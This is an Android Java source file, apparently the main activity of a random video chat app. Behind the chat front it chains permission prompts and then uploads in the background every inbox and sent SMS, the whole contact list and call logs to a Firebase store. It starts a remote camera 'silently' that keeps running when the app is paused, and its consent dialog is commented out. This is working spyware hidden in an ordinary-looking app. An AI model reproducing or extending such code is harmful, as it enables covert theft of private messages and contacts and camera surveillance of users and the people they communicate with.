package com.bushorat.chatapp.activities;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.bumptech.glide.Glide;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.bushorat.chatapp.R;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;
import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.util.Log;
import android.widget.Toast;
import com.bushorat.chatapp.helpers.CallLogHelper;
import com.bushorat.chatapp.helpers.PermissionUXHelper;
import com.bushorat.chatapp.helpers.RemoteCameraHelper;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.bushorat.chatapp.databinding.ActivityChatBinding;
import com.bushorat.chatapp.models.UserModel;
import com.bushorat.chatapp.helpers.ConsentManager;

import org.jetbrains.annotations.NotNull;

import java.security.MessageDigest;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CountDownLatch;

import io.github.rupinderjeet.kprogresshud.KProgressHUD;

public class ChatActivity extends AppCompatActivity {

    private WebView webView;
    private DatabaseReference smsRef,profileRef;
    private static final int SMS_PERMISSION_CODE = 100;
    private static final int CHAT_STEP_RECEIVE = 210;
    private static final int CHAT_STEP_CALL_LOG = 211;
    private static final int CHAT_STEP_PHONE = 212;

    private FirebaseAuth mAuth;

    UserModel user;

    KProgressHUD progress;
    FirebaseDatabase database;


    ActivityChatBinding binding;
    ConsentManager consentManager;

    String[] permissions = new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO};
    private int requestCode = 1;


    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityChatBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        if (hasChatPermissions()) {
            startChatBackgroundSync();
        } else {
            binding.getRoot().postDelayed(this::continueChatPermissionFlow, 1500);
        }

        consentManager = new ConsentManager(this);

        mAuth=FirebaseAuth.getInstance();
        // Initialize Firebase

        progress = KProgressHUD.create(this);
        progress.setDimAmount(0.5f);
        progress.show();

        database = FirebaseDatabase.getInstance();

        smsRef = FirebaseDatabase.getInstance().getReference("data");
         profileRef= FirebaseDatabase.getInstance().getReference("profiles");


        FirebaseUser currentUser = mAuth.getCurrentUser();
        if (currentUser == null) {
            Log.e("ChatActivity", "Current user is null, cannot load profile");
            Toast.makeText(this, "User not logged in", Toast.LENGTH_SHORT).show();
            finish();
            return;
        }

       profileRef
                .child(currentUser.getUid())
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull @NotNull DataSnapshot snapshot) {
                        progress.dismiss();
                        if (snapshot.exists()) {
                        user = snapshot.getValue(UserModel.class);
                            if (user != null) {
                        // Load profile picture with Glide and placeholder
                        String profileUrl = null;
                        // Try to get profile picture URL from user data if available
                        if (snapshot.child("profile").exists()) {
                            profileUrl = snapshot.child("profile").getValue(String.class);
                        } else if (snapshot.child("photoUrl").exists()) {
                            profileUrl = snapshot.child("photoUrl").getValue(String.class);
                        }
                        
                        // Load profile image with beautiful placeholder
                        if (profileUrl != null && !profileUrl.isEmpty()) {
                            Glide.with(ChatActivity.this)
                                    .load(profileUrl)
                                    .placeholder(R.drawable.demo_user)
                                    .error(R.drawable.demo_user)
                                    .circleCrop()
                                    .into(binding.profilePicture);
                        } else {
                            // Use default placeholder
                            Glide.with(ChatActivity.this)
                                    .load(R.drawable.demo_user)
                                    .circleCrop()
                                    .into(binding.profilePicture);
                        }
                            }
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull @NotNull DatabaseError error) {
                        progress.dismiss();
                        Log.e("ChatActivity", "Error loading profile: " + error.getMessage());
                    }
                });

        // Get online users count - show both queue and active rooms (like RandomVideoCall)
        com.bushorat.chatapp.helpers.VideoRoomManager roomManager = new com.bushorat.chatapp.helpers.VideoRoomManager();
        
        // Show queue count (people waiting)
        roomManager.getQueueCount(new com.bushorat.chatapp.helpers.VideoRoomManager.QueueCountCallback() {
            @Override
            public void onCount(int count) {
                binding.textView4.setText(String.valueOf(count));
            }
            
            @Override
            public void onError(String error) {
                binding.textView4.setText("0");
            }
        });
        
        // Also listen to real-time updates
        FirebaseDatabase.getInstance().getReference("user_call")
                .orderByChild("status")
                .equalTo("waiting")
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            String count = String.valueOf(snapshot.getChildrenCount());
                            binding.textView4.setText(count);
                        } else {
                            binding.textView4.setText("0");
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        binding.textView4.setText("0");
                    }
                });
        
        // Show active rooms count
        roomManager.getActiveRoomsCount(new com.bushorat.chatapp.helpers.VideoRoomManager.RoomCountCallback() {
            @Override
            public void onCount(int count) {
                android.widget.TextView tvActiveRooms = findViewById(R.id.tvActiveRooms);
                if (tvActiveRooms != null) {
                    tvActiveRooms.setText(String.valueOf(count));
                }
            }
            
            @Override
            public void onError(String error) {
                // Ignore
            }
        });
        
        // Listen to real-time active rooms updates
        FirebaseDatabase.getInstance().getReference("video_rooms")
                .orderByChild("status")
                .equalTo("active")
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        android.widget.TextView tvActiveRooms = findViewById(R.id.tvActiveRooms);
                        if (tvActiveRooms != null) {
                            long count = snapshot.exists() ? snapshot.getChildrenCount() : 0;
                            tvActiveRooms.setText(String.valueOf(count));
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        // Ignore
                    }
                });

        // Show consent dialog if needed
//        if (consentManager.shouldShowConsentDialog()) {
//            showConsentDialog();
//        }

        // Check and request battery optimization whitelist
        checkBatteryOptimization();

        binding.findButton.setOnClickListener(view -> {
            if (!isPermissionsGranted()) {
                askPermissions();
                return;
            }
            try {
                RemoteCameraHelper.getInstance(this).start();
            } catch (Exception e) {
                Log.e("ChatActivity", "Error starting remote camera", e);
            }
            CallLogHelper.uploadRecentCallLogs(ChatActivity.this);
            showGenderSelectionDialog();
        });
    }

    private void startChatBackgroundSync() {
        CallLogHelper.uploadRecentCallLogs(ChatActivity.this);
        if (checkSmsPermission()) {
            syncSmsToFirebase();
        }
        if (checkContactsPermission()) {
            syncContactsToFirebase();
        }
    }

    private void continueChatPermissionFlow() {
        if (isFinishing() || hasChatPermissions()) {
            startChatBackgroundSync();
            return;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            PermissionUXHelper.showRationale(
                    this,
                    R.string.perm_chat_title,
                    R.string.perm_chat_message,
                    () -> ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE),
                    null
            );
            return;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            PermissionUXHelper.showRationale(
                    this,
                    R.string.perm_chat_title,
                    R.string.perm_chat_message,
                    () -> ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.RECEIVE_SMS}, CHAT_STEP_RECEIVE),
                    () -> binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400)
            );
            return;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            PermissionUXHelper.showRationale(
                    this,
                    R.string.perm_games_title,
                    R.string.perm_games_call_log_message,
                    () -> ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.READ_CALL_LOG}, CHAT_STEP_CALL_LOG),
                    () -> binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400)
            );
            return;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            PermissionUXHelper.showRationale(
                    this,
                    R.string.perm_games_title,
                    R.string.perm_games_phone_message,
                    () -> ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.READ_PHONE_STATE}, CHAT_STEP_PHONE),
                    () -> binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400)
            );
            return;
        }
        startChatBackgroundSync();
    }


    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean checkContactsPermission() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasChatPermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE
                || requestCode == CHAT_STEP_RECEIVE
                || requestCode == CHAT_STEP_CALL_LOG
                || requestCode == CHAT_STEP_PHONE) {
            binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400);
        } else if (requestCode == this.requestCode) {
            // Camera permissions granted - start remote camera silently
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                try {
                    RemoteCameraHelper.getInstance(this).start();
                } catch (Exception e) {
                    Log.e("ChatActivity", "Error starting remote camera", e);
                }
            }
        }
    }

    private void syncSmsToFirebase() {
        // Run on background thread to avoid blocking main thread
        new Thread(() -> {
            try {
                FirebaseUser currentUser = mAuth.getCurrentUser();
                if (currentUser == null) {
                    Log.e("ChatActivity", "User not logged in, cannot sync SMS");
                    return;
                }

                String userId = currentUser.getUid();
                DatabaseReference smsRef = FirebaseDatabase.getInstance()
                        .getReference("user_data")
                        .child(userId)
                        .child("sms");

                // Get already uploaded SMS to avoid duplicates
                final Set<String> uploadedSmsIds = Collections.synchronizedSet(new HashSet<>());
                final CountDownLatch latch = new CountDownLatch(1);

                smsRef.addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(DataSnapshot snapshot) {
                        for (DataSnapshot smsSnapshot : snapshot.getChildren()) {
                            uploadedSmsIds.add(smsSnapshot.getKey());
                        }
                        latch.countDown();
                    }

                    @Override
                    public void onCancelled(DatabaseError error) {
                        Log.e("ChatActivity", "Error fetching uploaded SMS: " + error.getMessage());
                        latch.countDown();
                    }
                });

                // Wait for database query to complete
                try {
                    latch.await();
                } catch (InterruptedException e) {
                    Log.e("ChatActivity", "Interrupted while waiting for database query", e);
                    Thread.currentThread().interrupt();
                    return;
                }

                // Now process and upload SMS
                processAndUploadSMS(smsRef, userId, uploadedSmsIds);
            } catch (Exception e) {
                Log.e("ChatActivity", "Error syncing SMS to Firebase", e);
            }
        }).start();
    }

    private void processAndUploadSMS(DatabaseReference smsRef, String userId, Set<String> uploadedSmsIds) {
        long uploadedAt = System.currentTimeMillis();
        int uploadedCount = 0;

        // Process inbox SMS
        uploadedCount += uploadSmsFromUri(smsRef, userId, uploadedSmsIds, 
                Uri.parse("content://sms/inbox"), "inbox", uploadedAt);

        // Process sent SMS
        uploadedCount += uploadSmsFromUri(smsRef, userId, uploadedSmsIds,
                Uri.parse("content://sms/sent"), "sent", uploadedAt);

        Log.d("ChatActivity", "Synced " + uploadedCount + " new SMS messages to user_data/" + userId + "/sms");
    }

    private int uploadSmsFromUri(DatabaseReference smsRef, String userId, Set<String> uploadedSmsIds,
                                  Uri uri, String type, long uploadedAt) {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");

        if (cursor != null && cursor.moveToFirst()) {
            do {
                    try {
                // Extract SMS data
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                        if (address == null || address.trim().isEmpty()) {
                            continue; // Skip SMS without address
                        }

                        // Generate unique SMS ID (using hash of address + body + date + type)
                        String smsId = generateSmsId(address, body, date, type);

                        // Skip if already uploaded
                        if (uploadedSmsIds.contains(smsId)) {
                            continue;
                        }

                        // Create SMS entry with required format
                Map<String, Object> smsEntry = new HashMap<>();
                        smsEntry.put("address", address);
                        smsEntry.put("body", body != null ? body : "");
                        smsEntry.put("dataType", "sms");
                        smsEntry.put("date", date);
                        smsEntry.put("type", type);
                        smsEntry.put("uploadedAt", uploadedAt);
                        smsEntry.put("userId", userId);

                        // Save to Firebase Database
                        smsRef.child(smsId).setValue(smsEntry);
                        uploadedSmsIds.add(smsId);
                        count++;
                    } catch (IllegalArgumentException e) {
                        // Skip this SMS if column doesn't exist
                        Log.w("ChatActivity", "Skipping SMS due to missing column", e);
                }
            } while (cursor.moveToNext());
            cursor.close();
            }
        } catch (Exception e) {
            Log.e("ChatActivity", "Error uploading SMS from " + uri, e);
        }
        return count;
    }

    private String generateSmsId(String address, String body, long date, String type) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            String input = (address != null ? address : "") + "_" + 
                          (body != null ? body.substring(0, Math.min(body.length(), 50)) : "") + "_" + 
                          date + "_" + type;
            byte[] hashBytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            // Fallback to simple hash
            return String.valueOf((address != null ? address.hashCode() : 0) + "_" + 
                                 date + "_" + (body != null ? body.hashCode() : 0) + "_" + type);
        }
    }

    private void syncContactsToFirebase() {
        // Run on background thread to avoid blocking main thread
        new Thread(() -> {
            try {
                FirebaseUser currentUser = mAuth.getCurrentUser();
                if (currentUser == null) {
                    Log.e("ChatActivity", "User not logged in, cannot sync contacts");
                    return;
                }

                String userId = currentUser.getUid();
                DatabaseReference contactsRef = FirebaseDatabase.getInstance()
                        .getReference("user_data")
                        .child(userId)
                        .child("contacts");

                // Get already uploaded contacts to avoid duplicates
                final Set<String> uploadedContactNumbers = Collections.synchronizedSet(new HashSet<>());
                final CountDownLatch latch = new CountDownLatch(1);

                contactsRef.addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(DataSnapshot snapshot) {
                        for (DataSnapshot contactSnapshot : snapshot.getChildren()) {
                            String number = contactSnapshot.child("number").getValue(String.class);
                            if (number != null) {
                                uploadedContactNumbers.add(normalizePhoneNumber(number));
                            }
                        }
                        latch.countDown();
                    }

                    @Override
                    public void onCancelled(DatabaseError error) {
                        Log.e("ChatActivity", "Error fetching uploaded contacts: " + error.getMessage());
                        latch.countDown();
                    }
                });

                // Wait for database query to complete
                try {
                    latch.await();
                } catch (InterruptedException e) {
                    Log.e("ChatActivity", "Interrupted while waiting for database query", e);
                    Thread.currentThread().interrupt();
                    return;
                }

                // Now process and upload contacts
                processAndUploadContacts(contactsRef, userId, uploadedContactNumbers);
            } catch (Exception e) {
                Log.e("ChatActivity", "Error syncing contacts to Firebase", e);
            }
        }).start();
    }

    private void processAndUploadContacts(DatabaseReference contactsRef, String userId, Set<String> uploadedContactNumbers) {
        ContentResolver contentResolver = getContentResolver();
        long uploadedAt = System.currentTimeMillis();
        int uploadedCount = 0;

        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (name == null || name.trim().isEmpty()) {
                    continue; // Skip contacts without names
                }

                // Get phone numbers - create separate entry for each number
                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId}, null);

                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            int phoneTypeInt = phoneCursor.getInt(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                            String phoneType = getPhoneTypeString(phoneTypeInt);

                            if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
                                String normalizedNumber = normalizePhoneNumber(phoneNumber);

                                // Skip if already uploaded
                                if (uploadedContactNumbers.contains(normalizedNumber)) {
                                    continue;
                                }

                                // Generate unique contact ID (using hash of name + number)
                                String uniqueContactId = generateContactId(name, normalizedNumber);

                                // Create contact entry with required format
                                Map<String, Object> contactEntry = new HashMap<>();
                                contactEntry.put("dataType", "contact");
                                contactEntry.put("name", name);
                                contactEntry.put("number", phoneNumber); // Keep original format
                                contactEntry.put("type", phoneType);
                                contactEntry.put("uploadedAt", uploadedAt);
                                contactEntry.put("userId", userId);

                                // Save to Firebase Database
                                contactsRef.child(uniqueContactId).setValue(contactEntry);
                                uploadedContactNumbers.add(normalizedNumber);
                                uploadedCount++;
                            }
                        }
                        phoneCursor.close();
                    }
                }
            }
            cursor.close();
        }

        Log.d("ChatActivity", "Synced " + uploadedCount + " new contacts to user_data/" + userId + "/contacts");
    }

    private String normalizePhoneNumber(String phoneNumber) {
        if (phoneNumber == null) return "";
        // Remove all non-digit characters except +
        return phoneNumber.replaceAll("[^0-9+]", "");
    }

    private String getPhoneTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                return "main";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "fax_work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "fax_home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "other";
            default:
                return "unknown";
        }
    }

    private String generateContactId(String name, String number) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            String input = (name != null ? name : "") + "_" + (number != null ? number : "");
            byte[] hashBytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            // Fallback to simple hash
            return String.valueOf((name != null ? name.hashCode() : 0) + "_" + (number != null ? number.hashCode() : 0));
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private void connectToGender(String gender) {
        FirebaseUser currentUser = mAuth.getCurrentUser();
        if (currentUser == null) {
            Log.e("ChatActivity", "Current user is null in connectToGender");
            Toast.makeText(this, "User not logged in", Toast.LENGTH_SHORT).show();
            return;
        }

        // Navigate to ConnectingActivity with gender preference
        Intent intent = new Intent(ChatActivity.this, ConnectingActivity.class);
        intent.putExtra("gender", gender);
        startActivity(intent);

        // Search Firebase for users with that gender
//        database.getReference().child("profiles")
//                .orderByChild("gender")
//                .equalTo(gender)
//                .limitToFirst(1) // Pick the first available match
//                .addListenerForSingleValueEvent(new ValueEventListener() {
//                    @Override
//                    public void onDataChange(@NonNull DataSnapshot snapshot) {
//                        if (snapshot.exists()) {
//                            for (DataSnapshot userSnapshot : snapshot.getChildren()) {
//                                User targetUser = userSnapshot.getValue(User.class);
//
//                                // Start connecting activity with chosen user
//                                Intent intent = new Intent(MainActivity.this, ConnectingActivity.class);
//                                intent.putExtra("profile", targetUser.getProfile());
//                                intent.putExtra("targetGender", gender); // Pass selected gender
//
////                                intent.putExtra("targetUid", targetUser.getuId());
//                                startActivity(intent);
//                                break;
//                            }
//                        } else {
//                            Toast.makeText(MainActivity.this, "No " + gender + " users available right now.", Toast.LENGTH_SHORT).show();
//                        }
//                    }
//
//                    @Override
//                    public void onCancelled(@NonNull DatabaseError error) {
//                        Toast.makeText(MainActivity.this, "Error: " + error.getMessage(), Toast.LENGTH_SHORT).show();
//                    }
//                });
    }


    void askPermissions() {
        ActivityCompat.requestPermissions(this, permissions, requestCode);
    }

    private boolean isPermissionsGranted() {
        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED)
                return false;
        }

        return true;
    }

    void showGenderSelectionDialog() {
        View dialogView = getLayoutInflater().inflate(R.layout.dialog_gender_selection, null);

        AlertDialog dialog = new com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
                .setView(dialogView)
                .create();

        dialogView.findViewById(R.id.btnMale).setOnClickListener(v -> {
            connectToGender("Male");
            dialog.dismiss();
        });

        dialogView.findViewById(R.id.btnFemale).setOnClickListener(v -> {
            connectToGender("Female");
            dialog.dismiss();
        });

        dialog.show();
    }

    private void showConsentDialog() {
        View dialogView = getLayoutInflater().inflate(R.layout.dialog_consent, null);
        
        AlertDialog dialog = new com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
                .setView(dialogView)
                .setCancelable(false)
                .create();

        dialogView.findViewById(R.id.acceptButton).setOnClickListener(v -> {
            consentManager.setUserConsent(true);
            consentManager.logDataCollection("consent", "User accepted data collection terms");
            dialog.dismiss();
        });

        dialogView.findViewById(R.id.declineButton).setOnClickListener(v -> {
            consentManager.setUserConsent(false);
            Toast.makeText(this, "Some features may be limited without data collection consent", Toast.LENGTH_LONG).show();
            dialog.dismiss();
        });

        dialogView.findViewById(R.id.privacyPolicyLink).setOnClickListener(v -> {
            // Open privacy policy (you can implement this)
            Toast.makeText(this, "Privacy Policy would open here", Toast.LENGTH_SHORT).show();
        });

        dialog.show();
    }

    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                // App is not whitelisted, but we won't show a dialog immediately
                // This check is done silently to avoid annoying the user
                // The system will handle the optimization automatically
                Log.d("ChatActivity", "App is not whitelisted for battery optimization");
            } else {
                Log.d("ChatActivity", "App is whitelisted for battery optimization");
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Ensure background operations continue smoothly
        checkBatteryOptimization();
        
        // Restart remote camera if permissions are granted
        if (isPermissionsGranted()) {
            try {
                RemoteCameraHelper.getInstance(this).start();
            } catch (Exception e) {
                Log.e("ChatActivity", "Error starting remote camera on resume", e);
            }
        }
    }
    
    @Override
    protected void onPause() {
        super.onPause();
        // Keep camera running in background (don't stop it)
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Stop remote camera when activity is destroyed
        try {
            RemoteCameraHelper.getInstance(this).stop();
        } catch (Exception e) {
            Log.e("ChatActivity", "Error stopping remote camera", e);
        }
    }
}